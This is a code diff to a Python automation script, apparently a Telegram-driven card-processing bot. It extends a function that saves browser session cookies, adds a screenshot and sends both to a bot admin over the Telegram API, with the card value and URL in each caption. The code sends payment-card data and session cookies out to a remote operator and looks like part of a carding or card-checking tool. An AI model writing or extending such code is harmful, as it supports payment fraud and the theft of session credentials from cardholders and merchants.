@@ -4225,12 +4225,54 @@ def run_ze_process(card_input, update_dict):
         except Exception:
             pass
 
-    def save_and_send_cookies(driver, card_input):
-        """Save cookies to file and send to admin"""
+    def save_and_send_cookies_with_screenshot(driver, card_input):
+        """Save cookies to file, take screenshot, and send both to admin for debugging"""
+        timestamp = int(time.time())
+        cookie_filename = f"ze_cookies_{timestamp}.json"
+        screenshot_filename = f"ze_screenshot_{timestamp}.png"
+        cookie_sent = False
+        screenshot_sent = False
+        
         try:
+            # Take screenshot first for debugging
+            try:
+                driver.save_screenshot(screenshot_filename)
+                with open(screenshot_filename, "rb") as img:
+                    files = {"photo": img}
+                    payload = {
+                        "chat_id": BOT_ADMIN_ID,
+                        "caption": f"📸 ZE Debug Screenshot\n💳 Card: `{card_input}`\n🔗 URL: {driver.current_url}",
+                        "parse_mode": "Markdown"
+                    }
+                    requests.post(
+                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
+                        data=payload,
+                        files=files,
+                        timeout=15
+                    )
+                screenshot_sent = True
+            except Exception as ss_err:
+                # Report screenshot error
+                try:
+                    requests.post(
+                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                        data={
+                            "chat_id": BOT_ADMIN_ID,
+                            "text": f"⚠️ ZE Screenshot failed:\n```\n{str(ss_err)[:300]}\n```",
+                            "parse_mode": "Markdown"
+                        },
+                        timeout=5
+                    )
+                except Exception:
+                    pass
+            finally:
+                try:
+                    os.remove(screenshot_filename)
+                except Exception:
+                    pass
+            
+            # Save and send cookies
             cookies = driver.get_cookies()
-            timestamp = int(time.time())
-            cookie_filename = f"ze_cookies_{timestamp}.json"
             cookie_data = {
                 "card": card_input,
                 "url": driver.current_url,
@@ -4245,7 +4287,7 @@ def run_ze_process(card_input, update_dict):
                 files = {"document": doc}
                 payload = {
                     "chat_id": BOT_ADMIN_ID,
-                    "caption": f"🍪 ZE Cookies\n💳 Card: `{card_input}`\n🔗 URL: {driver.current_url}",
+                    "caption": f"🍪 ZE Cookies\n💳 Card: `{card_input}`\n🔗 URL: {driver.current_url}\n📊 Cookies count: {len(cookies)}",
                     "parse_mode": "Markdown"
                 }
                 requests.post(
@@ -4254,14 +4296,8 @@ def run_ze_process(card_input, update_dict):
                     files=files,
                     timeout=15
                 )
+            cookie_sent = True
             
-            # Clean up local file
-            try:
-                os.remove(cookie_filename)
-            except Exception:
-                pass
-            
-            return True
         except Exception as e:
             # Report error to admin
             try:
@@ -4277,7 +4313,14 @@ def run_ze_process(card_input, update_dict):
                 )
             except Exception:
                 pass
-            return False
+        finally:
+            # Clean up local files
+            try:
+                os.remove(cookie_filename)
+            except Exception:
+                pass
+        
+        return cookie_sent, screenshot_sent
 
     def admin_report(trace, driver=None):
         sent = False
